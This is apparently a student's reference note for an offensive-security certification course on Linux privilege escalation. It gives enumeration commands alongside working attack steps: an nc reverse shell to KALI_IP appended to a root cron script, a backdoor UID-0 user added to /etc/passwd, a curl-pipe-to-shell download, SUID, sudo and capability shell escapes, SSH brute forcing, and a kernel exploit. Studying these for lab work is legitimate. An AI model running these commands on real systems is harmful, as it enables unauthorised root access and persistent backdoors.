---
title: "PWK Module 18 - Linux Privilege Escalation"
created: "2026-04-05"
source: "PEN-200 PWK Course (OffSec 2025)"
type: reference-note
status: active
tags:
  - oscp
  - linux
  - privilege-escalation
  - privesc
  - linpeas
  - suid
  - sudo
  - cron
  - pwk
  - reference
  - module-18
---

# Module 18 — Linux Privilege Escalation

> **OSCP Exam Relevance:** Every Linux box on OSCP requires escalating from low-priv shell to root. Linux PrivEsc has a huge attack surface: SUID binaries, sudo misconfigs, writable cron scripts, exposed credentials, kernel exploits. Learn to enumerate methodically — LinPEAS + manual checks — then exploit what you find. GTFOBins is your bible.

**Learning Units Covered:**
- 18.1 Linux Enumeration (users, system, network, cron, files, SUID)
- 18.2 Automated Enumeration (LinPEAS, unix-privesc-check)
- 18.3 Exposed Confidential Information (env vars, credentials, process sniffing)
- 18.4 Insecure File Permissions (cron job hijacking, /etc/passwd write)
- 18.5 Insecure System Components (SUID abuse, capabilities, sudo misconfig, kernel exploits)

---

## 18.1 Manual Linux Enumeration

Run these systematically after getting a shell. Each command reveals attack surface.

### Identity

```bash
id
# uid=1000(joe) gid=1000(joe) groups=1000(joe)
# Breakdown:
# uid   = numeric user ID
# gid   = primary group ID
# groups = all group memberships (look for: sudo, docker, disk, lxd, adm)

whoami    # just the username
hostname  # machine name
```

**Interesting groups to look for:**
| Group | Privilege Escalation Path |
|-------|--------------------------|
| `sudo` | Run commands as root |
| `docker` | Mount host filesystem in container → read /root |
| `disk` | Raw disk access → read all files |
| `lxd` | Container escape → root on host |
| `adm` | Read log files (may contain credentials) |

### Users and Accounts

```bash
cat /etc/passwd
# Format: login:password:UID:GID:comment:home:shell
# joe:x:1000:1000:joe,,,:/home/joe:/bin/bash
# www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
#                                      ^^^^^^^^^^^^^^^^^
#                                      nologin = can't SSH in, but can still run scripts

# Key things to look for:
# UID 0 = root. Multiple UID-0 accounts = backdoor
# Accounts with shells (/bin/bash, /bin/sh) = active accounts
# Service accounts with nologin = less interesting for shell, but may have file access
```

**Readable shadow file?**
```bash
cat /etc/shadow    # only readable by root normally
# If readable: grab hashes → crack offline with hashcat mode 1800 (SHA-512)
```

### Operating System and Kernel

```bash
cat /etc/issue         # OS name (simple): "Debian GNU/Linux 10"
cat /etc/os-release    # Detailed OS info: PRETTY_NAME, VERSION_ID
uname -a               # Kernel version + architecture: Linux debian-privesc 4.19.0-21-amd64
uname -r               # Kernel version only: 4.19.0-21-amd64
arch                   # Architecture: x86_64
```

> 💡 **Kernel version is critical** — old kernels have public local privilege escalation exploits. Grab `uname -r` early and check searchsploit.

### Running Processes

```bash
ps aux
# USER PID %CPU %MEM ... COMMAND
# Focus on:
# - Processes running as root (especially servers/daemons)
# - Processes running scripts/configs you might be able to modify
# - Services running from non-standard paths

ps aux | grep -i "pass"   # any process with "pass" in command line?
```

**Watching processes over time** (to catch short-lived cron jobs that pass credentials):
```bash
watch -n 1 "ps -aux | grep pass"
# Runs ps every 1 second — catches processes that appear briefly
# Real example caught:
# root 16880 ... sh -c sshpass -p 'Lab123' ssh -t eve@127.0.0.1 'sleep 5;exit'
```

### Network Information

```bash
ip a           # all interfaces with IPs — multiple IPs = pivot opportunity
ip route       # routing table — other subnets reachable?
routel          # alternative routing table view

ss -anp        # all sockets with PID (-a=all, -n=numeric, -p=processes)
netstat -antup  # alternative (older systems)
# Look for: services listening on 127.0.0.1 only (internal services)
# e.g., :3306 LISTEN = MySQL locally only → can we connect with found credentials?

cat /etc/iptables/rules.v4    # firewall rules — what ports are allowed in/out?
```

### Scheduled Jobs (Cron)

Cron runs scripts at scheduled intervals. If a root-owned cron job calls a script **you can modify**, you own root.

```bash
# System-wide cron jobs
ls -lah /etc/cron*
cat /etc/crontab

# Your own cron jobs (usually empty)
crontab -l

# Read the cron log to see what's actually running
grep "CRON" /var/log/syslog
# Example:
# Aug 25 04:57:01 CRON[918]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
# → root is running user_backups.sh every minute!
```

**Look for scripts in user-writable locations being run by root cron jobs.**

### Installed Packages

```bash
# Debian/Ubuntu
dpkg -l                    # all installed packages with versions
dpkg -l | grep apache      # filter for specific software

# Red Hat/CentOS
rpm -qa

# Look for: old software versions → searchsploit for exploits
```

### Writable Directories and Files

```bash
# Find all world-writable directories
find / -writable -type d 2>/dev/null
# Focus on non-standard writable paths (skip /tmp, /proc)
# /home/joe/.scripts ← interesting!

# Find world-writable files
find / -writable -type f 2>/dev/null

# Find SUID binaries (run as the file owner, not the calling user)
find / -perm -u=s -type f 2>/dev/null
# Standard SUID binaries: passwd, sudo, su, mount — these are normal
# Non-standard SUID: check GTFOBins for abuse

# Find SGID binaries (run as the file group)
find / -perm -g=s -type f 2>/dev/null
```

### Drives and File Systems

```bash
cat /etc/fstab   # configured file systems + mount points
mount            # currently mounted file systems
lsblk            # block devices: sda, sda1, sda2, sda5 (SWAP)

# Look for: unmounted partitions, NFS shares, unusual mount points
```

### Kernel Modules

```bash
lsmod                          # loaded kernel modules
/sbin/modinfo <module_name>    # details about a specific module
# modinfo libata → filename: /lib/modules/4.19.0-21-amd64/.../libata.ko
# Used to identify: kernel version, vulnerable module versions
```

---

## 18.2 Automated Enumeration

### LinPEAS

LinPEAS is the Linux equivalent of WinPEAS — comprehensive automated enumeration with colour-coded output.

```bash
# On Kali — serve LinPEAS
cp /usr/share/peass/linpeas/linpeas.sh .
python3 -m http.server 80

# On target — download and run
wget http://KALI_IP/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh 2>/dev/null | tee /tmp/linpeas_output.txt

# Or run directly without writing to disk
curl http://KALI_IP/linpeas.sh | sh
```

**Key sections to review:**
- **System Information** — OS/kernel version
- **Sudo version** — old sudo → CVE-2021-3156 (Baron Samedit)
- **SUID** — non-standard SUID binaries
- **Sudo** — what can we run with sudo?
- **Cron** — writable scripts called by root
- **Passwords** — files containing "password", credentials in config files
- **Network** — internal services

### unix-privesc-check

Older but still useful. Checks file permissions for common misconfigurations.

```bash
# Transfer to target
scp /home/kali/offsec/unix-privesc-check joe@TARGET_IP:/home/joe/

# Run
./unix-privesc-check standard > output.txt
cat output.txt | grep "WARNING"
# WARNING: /etc/passwd is a critical config file. World write is set for /etc/passwd
# → Can write to /etc/passwd → add our own root user!
```

---

## 18.3 Exposed Confidential Information

### Environment Variables

```bash
env
# Look for variables that look like credentials:
# SCRIPT_CREDENTIALS=lab  ← a password!
# DB_PASSWORD=secret123
# API_KEY=abc123

# Confirm permanent vars (in .bashrc or .profile)
cat ~/.bashrc
# export SCRIPT_CREDENTIALS="lab"  ← hardcoded credential in shell config
```

**Why devs store passwords in env vars:** They think it's "more secure" than hardcoding in code. It's not — anyone who can read the shell config or `/proc/<pid>/environ` sees it.

### Credential Harvesting from Processes

```bash
# Watch for processes that pass credentials in command-line arguments
watch -n 1 "ps -aux | grep pass"

# Real example caught:
# root  sh -c sshpass -p 'Lab123' ssh -t eve@127.0.0.1 'sleep 5;exit'
# → root is SSH-ing to another service with password 'Lab123'
# → Try that password for other accounts (password reuse!)
```

### Network Sniffing for Plaintext Credentials

If you have sudo access to tcpdump (or root), capture loopback traffic:

```bash
sudo tcpdump -i lo -A | grep "pass"
# -i lo  = listen on loopback interface (127.0.0.1)
# -A     = print packet contents in ASCII
# Output:
# user:root,pass:lab
```

> ⚠️ **tcpdump may be restricted by AppArmor.** Check `/var/log/syslog` for `apparmor="DENIED"` if tcpdump seems to run but captures nothing. Use `aa-status` to see AppArmor profile status.

### Brute Forcing with Custom Wordlists

If you found part of a credential (e.g., `SCRIPT_CREDENTIALS=lab` suggests `Lab` prefix):

```bash
# Generate a wordlist from the pattern
crunch 6 6 -t Lab%%%   # 6-char words, "Lab" + 3 digits
# Lab000, Lab001 ... Lab999

crunch 6 6 -t Lab%%% > wordlist.txt

# Brute force SSH
hydra -l eve -P wordlist.txt 192.168.50.214 -t 4 ssh
# Found: eve : Lab123
```

After finding eve's password → check sudo permissions:

```bash
sudo -l
# User eve may run the following commands:
#     (ALL : ALL) ALL
# → Full sudo! Just run: sudo -i
```

---

## 18.4 Insecure File Permissions

### Abusing Writable Cron Job Scripts

**The setup:** Root runs a cron job every minute calling a shell script that *you* can write to.

```bash
# 1. Find the cron job
grep "CRON" /var/log/syslog
# root CMD (/bin/bash /home/joe/.scripts/user_backups.sh)

# 2. Inspect the script
cat /home/joe/.scripts/user_backups.sh
# #!/bin/bash
# cp -rf /home/joe/ /var/backups/joe/

# 3. Check permissions
ls -lah /home/joe/.scripts/user_backups.sh
# -rwxrwxrw- 1 root root  ← world-writable! Anyone can edit it.
```

**Why this works:** Root runs the script → whatever we put in the script runs as root.

```bash
# 4. Append a reverse shell payload to the script
echo "" >> /home/joe/.scripts/user_backups.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc KALI_IP 1234 >/tmp/f" >> user_backups.sh

# Verify the payload was appended
cat user_backups.sh
```

**The mkfifo reverse shell explained:**
- `rm /tmp/f` — remove old pipe if exists
- `mkfifo /tmp/f` — create a named pipe (FIFO)
- `cat /tmp/f | /bin/sh -i 2>&1` — read from pipe, execute as shell commands, redirect stderr to stdout
- `| nc KALI_IP 1234 > /tmp/f` — send output to netcat, write what netcat receives back to the pipe

```bash
# 5. Set up listener on Kali
nc -lnvp 1234

# 6. Wait for the cron job to run (up to 60 seconds)
# connect to [192.168.118.2] from (UNKNOWN) [192.168.50.214] 57698
# # id
# uid=0(root) gid=0(root) groups=0(root)
```

### Abusing Writable /etc/passwd

**The setup:** `/etc/passwd` is world-writable (rare but happens on misconfigured CTF/lab machines). You can add a new root-level user directly.

**How Linux uses /etc/passwd vs /etc/shadow:**
- Normally: `x` in the password field of `/etc/passwd` means "check `/etc/shadow`"
- BUT: If you put an actual password hash in `/etc/passwd`, Linux **uses that hash directly** — `/etc/shadow` is ignored!
- This means you can create a backdoor root account that doesn't touch `/etc/shadow` at all.

```bash
# 1. Confirm /etc/passwd is writable
ls -la /etc/passwd
# -rw-rw-rw- 1 root root  ← world-writable!

# 2. Generate a password hash for "w00t"
openssl passwd w00t
# Fdzt.eqJQ4s0g

# 3. Append a new root user (UID=0, GID=0)
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
# Format: username:HASH:UID:GID:comment:home:shell
#                      ^0:0 = root UID and GID

# 4. Switch to the new root user
su root2
# Password: w00t

# id
# uid=0(root) gid=0(root) groups=0(root)  → ROOT!
```

---

## 18.5 Insecure System Components

### SUID Binary Abuse

**SUID (Set User ID)** — when a binary has the SUID bit set, it runs as the **file owner** (usually root) regardless of who executes it. If a SUID binary can be tricked into running a shell, you get root.

```bash
# Find all SUID binaries
find / -perm -u=s -type f 2>/dev/null
```

**Standard SUID binaries** (expected — not exploitable by themselves): `passwd`, `sudo`, `su`, `mount`, `newgrp`

**Non-standard SUID binaries** — check [GTFOBins](https://gtfobins.github.io/) for each one.

**Example — SUID `find` binary:**
```bash
# If find has SUID set:
find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
# -exec runs bash with -p flag (preserve EUID/EGID — keeps root privileges)
whoami
# root
```

**Why `-p` matters:** Without `-p`, bash drops the SUID privileges on startup as a security measure. With `-p`, it keeps the elevated EUID (effective user ID).

### Linux Capabilities

Linux **capabilities** give processes fine-grained privileges without full root. Some capabilities can be abused to escalate.

```bash
# Find binaries with capabilities set
/usr/sbin/getcap -r / 2>/dev/null
# /usr/bin/perl = cap_setuid+ep
# cap_setuid = can set UID to any value (including 0/root)
# +ep = effective + permitted
```

**`cap_setuid+ep` on perl** = perl can set its own UID to 0 = root shell:

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# id
# uid=0(root) gid=1000(joe)  → root!
```

**Why this works:** POSIX `setuid(0)` changes the process's user ID to 0 (root). Without `cap_setuid`, this would be denied. With the capability, it succeeds.

Other dangerous capabilities to look for:
| Capability | Risk |
|-----------|------|
| `cap_setuid` | Set UID to root |
| `cap_setgid` | Set GID to privileged group |
| `cap_sys_admin` | Many things including mounting filesystems |
| `cap_net_raw` | Capture network traffic (like tcpdump) |
| `cap_dac_read_search` | Read any file, bypass permission checks |

### Sudo Misconfigurations

**`sudo -l`** shows what commands you can run as root. Many binaries that seem harmless can escape to a shell.

```bash
sudo -l
# User joe may run the following commands:
#     (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
```

**Check GTFOBins for each allowed command.** Common escapes:

```bash
# apt-get sudo escape
sudo apt-get changelog apt
!/bin/sh     # type this in the pager → spawns root shell

# Result:
# # id
# uid=0(root) gid=0(root) groups=0(root)
```

**Why apt-get changelog works:** `apt-get changelog` opens the changelog in a pager (like `less`). In `less`, `!` runs a shell command. Since `apt-get` was run as root (via sudo), the shell spawned is also root.

```bash
# tcpdump sudo escape (via -z flag shell execution)
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
# Runs $TF as a post-rotation command (-z) with root (-Z root)
# May be blocked by AppArmor! Check /var/log/syslog for DENIED
```

**AppArmor blocking sudo abuse:**
```bash
cat /var/log/syslog | grep tcpdump
# apparmor="DENIED" operation="exec" profile="/usr/sbin/tcpdump"
# → AppArmor has a profile restricting what tcpdump can execute

# Check AppArmor status
aa-status
# /usr/sbin/tcpdump → enforce mode  ← blocked!
```

If tcpdump is blocked by AppArmor → try other sudo-allowed binaries (apt-get, vim, find, python, etc.).

### Kernel Exploits

If nothing else works, look for unpatched kernel vulnerabilities.

```bash
# Gather target OS and kernel info
cat /etc/issue       # Ubuntu 16.04.4 LTS
uname -r             # 4.4.0-116-generic
arch                 # x86_64
```

```bash
# Search for kernel exploits
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep "4." | grep -v "< 4.4.0" | grep -v "4.8"
# Found: Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local PrivEsc → 45010.c
```

```bash
# Copy and inspect exploit
cp /usr/share/exploitdb/exploits/linux/local/45010.c .
head 45010.c -n 20
# gcc cve-2017-16995.c -o cve-2017-16995 (compiler command in the comments!)

mv 45010.c cve-2017-16995.c
```

**Option A — Compile on Kali and transfer:**
```bash
# Kali: compile for target architecture
gcc cve-2017-16995.c -o cve-2017-16995

# Transfer
scp cve-2017-16995 joe@TARGET_IP:
```

**Option B — Transfer source and compile on target (preferred):**
```bash
# Target may have different libc — compile locally for best compatibility
scp cve-2017-16995.c joe@TARGET_IP:

# On target
gcc cve-2017-16995.c -o cve-2017-16995

# Verify architecture matches
file cve-2017-16995
# ELF 64-bit LSB executable, x86-64  ← matches target arch

# Run it
./cve-2017-16995
# [.] t(-_-t) exploit for counterfeit grsec kernels...
# [.] ...
# # id → uid=0(root)
```

> 💡 **Always compile on the target when possible.** Kernel exploits depend on exact library versions and kernel headers. A binary compiled on Kali for a different kernel may segfault instead of escalating.

---

## Linux PrivEsc Decision Tree

```
Got a low-priv shell?
    ↓
id → check groups (sudo, docker, disk, lxd, adm?)
    ↓
sudo -l → allowed commands → GTFOBins for each
    ↓
Run LinPEAS → review output
    ↓
SUID binaries → find / -perm -u=s → GTFOBins
    ↓
Capabilities → getcap -r / → cap_setuid, cap_sys_admin?
    ↓
Cron jobs → grep "CRON" /var/log/syslog → writable scripts?
    ↓
Writable /etc/passwd? → add root2 user
    ↓
env → credentials in environment variables?
    ↓
watch ps for credential leaks → tcpdump loopback
    ↓
Kernel version → searchsploit → compile and run
```

---

## Quick Reference — All Commands

```bash
# Identity
id; whoami; hostname

# OS and kernel
cat /etc/issue; cat /etc/os-release; uname -a; uname -r; arch

# Users
cat /etc/passwd; cat /etc/shadow (if readable)

# Processes
ps aux
watch -n 1 "ps -aux | grep pass"

# Network
ip a; ip route; routel
ss -anp
cat /etc/iptables/rules.v4

# Cron
ls -lah /etc/cron*; crontab -l
grep "CRON" /var/log/syslog

# Packages
dpkg -l; rpm -qa

# File system
cat /etc/fstab; mount; lsblk
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null

# SUID
find / -perm -u=s -type f 2>/dev/null

# Capabilities
/usr/sbin/getcap -r / 2>/dev/null

# Sudo
sudo -l

# Credentials
env; cat ~/.bashrc
sudo tcpdump -i lo -A | grep "pass"

# Cron abuse
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc KALI_IP PORT >/tmp/f" >> /path/to/script.sh

# /etc/passwd abuse
openssl passwd w00t
echo "root2:HASH:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2

# SUID find escape
find /any/path -exec "/usr/bin/bash" -p \;

# Capabilities perl escape
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

# Sudo apt-get escape
sudo apt-get changelog apt
!/bin/sh

# Wordlist generation
crunch 6 6 -t Lab%%% > wordlist.txt
hydra -l eve -P wordlist.txt TARGET -t 4 ssh

# Kernel exploit
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"
scp exploit.c joe@TARGET_IP:
gcc exploit.c -o exploit && ./exploit
```

---

## Connections

- [[PWK-Module-17-Windows-PrivEsc]] — Windows equivalent; same methodology, different tools
- [[PWK-Module-16-Password-Attacks]] — crack /etc/shadow hashes with hashcat mode 1800
- [[Linux-PrivEsc-Decision-Tree]] — permanent note on attack selection logic
- [[OSCP-Certification-Sprint]] — parent project

## External Resources

- [GTFOBins](https://gtfobins.github.io/) — SUID/sudo/capability escape for every Linux binary
- [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
- [PayloadsAllTheThings - Linux PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [HackTricks - Linux PrivEsc](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)
- [g0tmi1k's Linux PrivEsc guide](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) — classic reference
- [IppSec](https://www.youtube.com/@ippsec) — search any Linux box walkthrough

---

## Practice Labs

| Room / Machine | Platform | What it practices |
|----------------|----------|-------------------|
| [Common Linux Privesc](https://tryhackme.com/room/commonlinuxprivesc) | TryHackMe | SUID, sudo misconfigs, writable /etc/passwd, cron jobs, path hijacking |
| [Internal](https://tryhackme.com/room/internal) | TryHackMe | Linux privesc via SSH private key discovery after pivoting through internal services |
| [0day](https://tryhackme.com/room/0day) | TryHackMe | Shellshock (CVE-2014-6271) CGI exploit → Linux kernel PrivEsc (overlayfs) |
